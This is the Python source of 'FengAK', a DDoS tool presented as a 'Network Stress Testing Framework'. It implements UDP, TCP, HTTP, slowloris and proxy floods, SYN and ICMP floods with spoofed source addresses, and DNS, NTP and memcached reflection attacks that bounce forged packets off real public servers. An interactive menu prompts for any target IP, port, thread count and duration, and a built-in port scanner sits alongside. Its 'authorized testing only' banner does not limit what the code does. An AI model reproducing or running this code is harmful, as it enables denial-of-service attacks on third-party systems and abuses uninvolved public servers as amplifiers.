import sys
import os
import time
import socket
import random
import threading
import json
from datetime import datetime
from socket import gethostbyname

try:
    from scapy.all import IP, TCP, ICMP, UDP, send, sr1, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

class Stats:
    def __init__(self):
        self.sent = 0
        self.bytes = 0
        self.start = None
        self.lock = threading.Lock()
        self.running = False
        self.limit = None
        self.peak = 0
        self.errors = 0

    def inc(self, count=1, size=0):
        with self.lock:
            self.sent += count
            self.bytes += size

    def get_sent(self):
        with self.lock:
            return self.sent

    def get_bytes(self):
        with self.lock:
            return self.bytes

    def elapsed(self):
        return time.time() - self.start if self.start else 0

    def qps(self):
        e = self.elapsed()
        if e > 1:
            q = self.get_sent() / e
            if q > self.peak:
                self.peak = q
            return q
        return 0

    def bw(self):
        e = self.elapsed()
        return self.get_bytes() / e / 1024 / 1024 if e > 1 else 0

    def check(self):
        if self.limit and self.elapsed() >= self.limit:
            self.running = False
            return False
        return True

stats = Stats()

def fmt_bytes(n):
    if n < 1024: return f"{n} B"
    if n < 1024**2: return f"{n/1024:.2f} KB"
    if n < 1024**3: return f"{n/1024**2:.2f} MB"
    return f"{n/1024**3:.2f} GB"

def fmt_num(n):
    if n >= 1_000_000: return f"{n/1_000_000:.1f}M"
    if n >= 1000: return f"{n/1000:.1f}K"
    return str(int(n))

def banner():
    os.system("clear")
    print(f"""{C.CYN}{C.B}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   {C.MAG}███████╗███████╗███╗   ██╗ ██████╗ {C.CYN}                       ║
    ║   {C.MAG}██╔════╝██╔════╝████╗  ██║██╔════╝ {C.CYN}                       ║
    ║   {C.MAG}█████╗  █████╗  ██╔██╗ ██║██║  ███╗{C.CYN}                       ║
    ║   {C.MAG}██╔══╝  ██╔══╝  ██║╚██╗██║██║   ██║{C.CYN}                       ║
    ║   {C.MAG}██║     ███████╗██║ ╚████║╚██████╔╝{C.CYN}                       ║
    ║   {C.MAG}╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ {C.CYN}                       ║
    ║                                                              ║
    ║   {C.WHT}FengAK vS2.0{C.CYN}  {C.D}Network Stress Testing Framework{C.CYN}           ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║   {C.D}AUTHOR :{C.WHT} FengPwner{C.CYN}                                      ║
    ║   {C.D}GITHUB :{C.WHT} github.com/FengPwner{C.CYN}                            ║
    ║   {C.D}ATOMGIT:{C.WHT} atomgit.com/FengPwner{C.CYN}                           ║
    ║   {C.D}CSDN   :{C.WHT} blog.csdn.net/2302_76189356{C.CYN}                     ║
    ╠══════════════════════════════════════════════════════════════╣
    ║   {C.RED}{C.B}⚠  FOR AUTHORIZED TESTING ONLY - DO NOT USE ILLEGALLY  ⚠{C.CYN}   ║
    ╚══════════════════════════════════════════════════════════════╝{C.R}
""")

def panel(title, lines, col=C.CYN):
    w = 58
    print(f"{col}┌{'─'*w}┐{C.R}")
    print(f"{col}│{C.R} {C.B}{title.center(w)}{C.R} {col}│{C.R}")
    print(f"{col}├{'─'*w}┤{C.R}")
    for l in lines:
        print(f"{col}│{C.R} {l.ljust(w)} {col}│{C.R}")
    print(f"{col}└{'─'*w}┘{C.R}")

def status_bar(ip, port, mode):
    e = stats.elapsed()
    m, s = int(e // 60), int(e % 60)
    pw = 16
    p = min(e / 300, 1.0) if stats.limit else min(e / 60, 1.0)
    f = int(pw * p)
    bar = "█" * f + "░" * (pw - f)
    print(
        f"\r{C.CYN}◈ {ip}:{port} {mode.upper():<10}{C.R} "
        f"{C.YEL}[{bar}]{C.R} {m:02d}:{s:02d}  "
        f"{C.GRN}{fmt_num(stats.get_sent()):>7} pkt  {fmt_num(stats.qps()):>5} qps  "
        f"{stats.bw():.1f}MB/s{C.R}\033[K",
        end="", flush=True
    )

def verify(ip, port, iv=10):
    while stats.running:
        st, det, lat = "UNKNOWN", "", 0
        if SCAPY_AVAILABLE:
            try:
                sp = random.randint(1024, 65535)
                t0 = time.time()
                r = sr1(IP(dst=ip)/TCP(dport=port, sport=sp, flags="S"), timeout=3, verbose=False)
                lat = (time.time() - t0) * 1000
                if r is None:
                    st, det = "NO_REPLY", "filtered"
                elif r.haslayer(TCP):
                    fl = r[TCP].flags
                    if fl & 0x12: st, det = "OPEN", "SYN+ACK"
                    elif fl & 0x14: st, det = "CLOSED", "RST"
                    else: st, det = "REPLIED", f"flags={fl}"
                elif r.haslayer(ICMP):
                    st, det = ("UNREACHABLE", "ICMP unreach") if r[ICMP].type == 3 else ("ICMP", f"type={r[ICMP].type}")
                else:
                    st, det = "REPLIED", r.summary()
            except Exception as ex:
                st, det = "ERROR", str(ex)
        else:
            try:
                sk = socket.socket()
                sk.settimeout(3)
                t0 = time.time()
                sk.connect((ip, port))
                lat = (time.time() - t0) * 1000
                st, det = "OPEN", "TCP connected"
                sk.close()
            except ConnectionRefusedError:
                st, det = "CLOSED", "refused"
            except socket.timeout:
                st, det = "TIMEOUT", "no response"
            except OSError as ex:
                st, det = "ERROR", str(ex)
        c = {"OPEN": C.GRN, "CLOSED": C.YEL, "UNREACHABLE": C.RED, "TIMEOUT": C.YEL,
             "NO_REPLY": C.YEL, "ERROR": C.RED, "REPLIED": C.CYN, "ICMP": C.MAG}.get(st, C.WHT)
        print(f"\n{c}[{datetime.now():%H:%M:%S}] ◈ {ip}:{port} → {st} ({det}) [{lat:.0f}ms]{C.R}")
        time.sleep(iv)

def udp_flood(ip, port, size):
    while stats.running:
        try:
            sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            d = random._urandom(size)
            sk.sendto(d, (ip, port))
            stats.inc(1, len(d))
            sk.close()
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def tcp_flood(ip, port, size):
    while stats.running:
        try:
            sk = socket.socket()
            sk.settimeout(1)
            sk.connect((ip, port))
            d = random._urandom(size)
            sk.sendall(d)
            stats.inc(1, len(d))
            sk.close()
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def syn_flood(ip, port, size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            p = IP(src=sip, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")/Raw(load=random._urandom(size))
            send(p, verbose=False)
            stats.inc(1, size)
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def icmp_flood(ip, port, size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            p = IP(src=sip, dst=ip)/ICMP()/Raw(load=random._urandom(size))
            send(p, verbose=False)
            stats.inc(1, size)
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def http_flood(ip, port, size):
    while stats.running:
        try:
            sk = socket.socket()
            sk.settimeout(2)
            sk.connect((ip, port))
            req = (
                f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            sk.send(req.encode())
            stats.inc(1, len(req))
            sk.close()
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def dns_amp(ip, port, size):
    if not SCAPY_AVAILABLE: return
    servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222"]
    while stats.running:
        try:
            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            p = IP(src=sip, dst=random.choice(servers))/UDP(sport=random.randint(1024,65535), dport=53)/Raw(load=random._urandom(size))
            send(p, verbose=False)
            stats.inc(1, size)
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def proxy_flood(ip, port, size, proxies):
    while stats.running:
        try:
            ph, pp = random.choice(proxies).split(":")
            sk = socket.socket()
            sk.settimeout(2)
            sk.connect((ph, int(pp)))
            sk.send(f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode())
            if b"200" in sk.recv(1024):
                d = random._urandom(size)
                sk.send(d)
                stats.inc(1, len(d))
            sk.close()
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def slowloris(ip, port, size):
    while stats.running:
        try:
            sk = socket.socket()
            sk.settimeout(5)
            sk.connect((ip, port))
            sk.send(b"GET / HTTP/1.1\r\n")
            sk.send(f"Host: {ip}\r\n".encode())
            sk.send(b"User-Agent: Mozilla/5.0\r\nContent-Length: 10000\r\nConnection: keep-alive\r\n")
            time.sleep(0.1)
            sk.send(b"X-a: b\r\n")
            stats.inc(1, 100)
            time.sleep(5)
            sk.close()
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def ntp_amp(ip, port, size):
    if not SCAPY_AVAILABLE: return
    servers = ["129.6.15.28", "129.6.15.29", "132.163.4.101", "132.163.4.102"]
    while stats.running:
        try:
            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
            p = IP(src=sip, dst=random.choice(servers))/UDP(sport=random.randint(1024,65535), dport=123)/Raw(load=payload)
            send(p, verbose=False)
            stats.inc(1, len(payload))
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def memcached_amp(ip, port, size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            p = IP(src=sip, dst=random.choice(["1.1.1.1", "2.2.2.2"]))/UDP(sport=random.randint(1024,65535), dport=11211)/Raw(load=b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n")
            send(p, verbose=False)
            stats.inc(1, size)
        except Exception:
            stats.errors += 1
        if not stats.check(): break

def save_log(entry):
    try:
        with open("attack_log.jsonl", "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass

def scan(ip, ports, to=1):
    out = []
    for p in ports:
        try:
            sk = socket.socket()
            sk.settimeout(to)
            out.append((p, "OPEN" if sk.connect_ex((ip, p)) == 0 else "CLOSED"))
            sk.close()
        except Exception:
            out.append((p, "ERROR"))
    return out

def monitor(ip, port, mode):
    while stats.running:
        status_bar(ip, port, mode)
        time.sleep(1)

def run(ip, port, mode, size, threads, proxies=None, dur=None):
    stats.running = True
    stats.start = time.time()
    stats.limit = dur
    stats.peak = 0
    stats.errors = 0

    fns = {"udp": udp_flood, "tcp": tcp_flood, "syn": syn_flood, "icmp": icmp_flood,
           "http": http_flood, "dns": dns_amp, "proxy": proxy_flood,
           "slowloris": slowloris, "ntp": ntp_amp, "memcached": memcached_amp}
    fn = fns.get(mode)
    if not fn:
        print(f"{C.RED}[-] Unknown mode: {mode}{C.R}")
        return
    if mode == "proxy" and not proxies:
        print(f"{C.RED}[-] Proxy mode needs a proxy list.{C.R}")
        return

    threading.Thread(target=monitor, args=(ip, port, mode), daemon=True).start()
    threading.Thread(target=verify, args=(ip, port, 10), daemon=True).start()

    pool = []
    for _ in range(threads):
        args = (ip, port, size, proxies) if mode == "proxy" else (ip, port, size)
        t = threading.Thread(target=fn, args=args, daemon=True)
        t.start()
        pool.append(t)

    try:
        while stats.running:
            if not stats.check():
                print(f"\n{C.YEL}[!] Duration limit reached ({dur}s).{C.R}")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{C.YEL}[!] Interrupted.{C.R}")

    stats.running = False
    for t in pool:
        t.join(timeout=2)

    e = stats.elapsed()
    sent = stats.get_sent()
    save_log({"time": datetime.now().isoformat(), "target": f"{ip}:{port}", "mode": mode,
              "threads": threads, "sent": sent, "bytes": stats.get_bytes(),
              "elapsed": e, "errors": stats.errors, "peak_qps": stats.peak})

    w = 58
    print(f"\n{C.GRN}╔{'═'*w}╗{C.R}")
    print(f"{C.GRN}║{C.R} {C.B}{'ATTACK SUMMARY'.center(w)}{C.R} {C.GRN}║{C.R}")
    print(f"{C.GRN}╠{'═'*w}╣{C.R}")
    for k, v in [("Target", f"{ip}:{port}"), ("Mode", mode.upper()), ("Threads", threads),
                 ("Packets Sent", fmt_num(sent)), ("Data Sent", fmt_bytes(stats.get_bytes())),
                 ("Duration", f"{e:.1f}s"), ("Peak QPS", fmt_num(stats.peak)),
                 ("Errors", stats.errors)]:
        print(f"{C.GRN}║{C.R} {k:<16}{C.D}:{C.R} {v:<{w-19}} {C.GRN}║{C.R}")
    print(f"{C.GRN}╚{'═'*w}╝{C.R}")

def prompt_err(edit=True):
    while True:
        opts = "(y) menu / (n) exit / (e) edit" if edit else "(y) menu / (n) exit"
        ch = input(f"{C.YEL}[?] {opts}: {C.R}").strip().lower()
        if ch == 'y': return 'y'
        if ch == 'n':
            print(f"{C.GRN}[*] Goodbye!{C.R}")
            sys.exit(0)
        if ch == 'e' and edit: return 'e'
        print(f"{C.RED}[-] Invalid choice.{C.R}")

def load_proxies(path):
    out = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    out.append(line)
    except FileNotFoundError:
        print(f"{C.RED}[-] File not found: {path}{C.R}")
    return out

def validate_proxies(lst, to=2):
    ok = []
    print(f"{C.CYN}[*] Validating {len(lst)} proxies...{C.R}")
    for p in lst:
        try:
            h, pt = p.split(":")
            sk = socket.socket()
            sk.settimeout(to)
            if sk.connect_ex((h, int(pt))) == 0:
                ok.append(p)
            sk.close()
        except Exception:
            pass
    print(f"{C.GRN}[+] {len(ok)}/{len(lst)} alive.{C.R}")
    return ok

def main():
    modes = ["udp", "tcp", "syn", "icmp", "http", "dns", "proxy", "slowloris", "ntp", "memcached"]
    while True:
        banner()
        print()
        panel("SYSTEM INFO", [
            f"Platform : {sys.platform}",
            f"Python   : {sys.version.split()[0]}",
            f"PID      : {os.getpid()}",
            f"Scapy    : {'YES' if SCAPY_AVAILABLE else 'NO'}",
        ])
        print()
        try:
            while True:
                t = input(f"{C.BLU}  ┌─[{C.WHT}1/5{C.BLU}] Target IP / Domain: {C.R}").strip()
                if t.lower() == 'exit':
                    print(f"{C.GRN}[*] Goodbye!{C.R}")
                    sys.exit(0)
                try:
                    ip = gethostbyname(t)
                    print(f"{C.GRN}  └─[+] Resolved: {C.WHT}{ip}{C.R}\n")
                    break
                except socket.gaierror:
                    print(f"{C.RED}  └─[-] Cannot resolve target.{C.R}\n")
                    if prompt_err() == 'e': continue
                    break

            while True:
                pi = input(f"{C.BLU}  ┌─[{C.WHT}2/5{C.BLU}] Port (1-65535): {C.R}").strip()
                if pi.lower() == 'exit':
                    print(f"{C.GRN}[*] Goodbye!{C.R}")
                    sys.exit(0)
                try:
                    port = int(pi)
                    if not 1 <= port <= 65535: raise ValueError
                    print(f"{C.GRN}  └─[+] Port set: {C.WHT}{port}{C.R}\n")
                    break
                except ValueError:
                    print(f"{C.RED}  └─[-] Invalid port.{C.R}\n")
                    if prompt_err() == 'e': continue
                    break

            if input(f"{C.BLU}  ┌─[{C.WHT}?{C.BLU}] Quick port scan? (y/n): {C.R}").strip().lower() == 'y':
                print(f"{C.CYN}  └─[*] Scanning...{C.R}\n")
                panel("PORT SCAN", [f"{p:<8} {s}" for p, s in scan(ip, [21,22,23,53,80,443,3306,3389,8080])], C.MAG)
                print()

            while True:
                print(f"{C.D}  modes: {' / '.join(modes)}{C.R}")
                m = input(f"{C.BLU}  ┌─[{C.WHT}3/5{C.BLU}] Attack mode: {C.R}").strip().lower()
                if m == 'exit':
                    print(f"{C.GRN}[*] Goodbye!{C.R}")
                    sys.exit(0)
                if m in modes:
                    print(f"{C.GRN}  └─[+] Mode: {C.WHT}{m}{C.R}\n")
                    break
                print(f"{C.RED}  └─[-] Invalid mode.{C.R}\n")
                if prompt_err() == 'e': continue
                break

            proxies = None
            if m == "proxy":
                pf = input(f"{C.BLU}  ┌─[{C.WHT}+{C.BLU}] Proxy file (ip:port per line): {C.R}").strip()
                proxies = load_proxies(pf)
                if proxies and input(f"{C.BLU}  ├─[{C.WHT}?{C.BLU}] Validate proxies? (y/n): {C.R}").strip().lower() == 'y':
                    proxies = validate_proxies(proxies)
                if not proxies:
                    print(f"{C.RED}  └─[-] No proxies, falling back to tcp.{C.R}\n")
                    m = "tcp"

            while True:
                ti = input(f"{C.BLU}  ┌─[{C.WHT}4/5{C.BLU}] Threads (1-10000): {C.R}").strip()
                if ti.lower() == 'exit':
                    print(f"{C.GRN}[*] Goodbye!{C.R}")
                    sys.exit(0)
                try:
                    th = int(ti)
                    if not 1 <= th <= 10000: raise ValueError
                    print(f"{C.GRN}  └─[+] Threads: {C.WHT}{th}{C.R}\n")
                    break
                except ValueError:
                    print(f"{C.RED}  └─[-] Invalid thread count.{C.R}\n")
                    if prompt_err() == 'e': continue
                    break

            while True:
                di = input(f"{C.BLU}  ┌─[{C.WHT}5/5{C.BLU}] Duration seconds (0=unlimited): {C.R}").strip()
                try:
                    dur = int(di)
                    if dur < 0: raise ValueError
                    print(f"{C.GRN}  └─[+] Duration: {C.WHT}{'unlimited' if dur == 0 else f'{dur}s'}{C.R}\n")
                    break
                except ValueError:
                    print(f"{C.RED}  └─[-] Invalid duration.{C.R}\n")

            os.system("clear")
            print(f"{C.CYN}{C.B}  [*] Starting... Ctrl+C to stop.{C.R}")
            print(f"{C.YEL}  [*] Verification every 10s.{C.R}\n")
            run(ip, port, m, 64, th, proxies, dur if dur > 0 else None)
            print()
            prompt_err(edit=False)
        except Exception as ex:
            print(f"{C.RED}[!] {ex}{C.R}")
            time.sleep(2)

if __name__ == "__main__":
    main()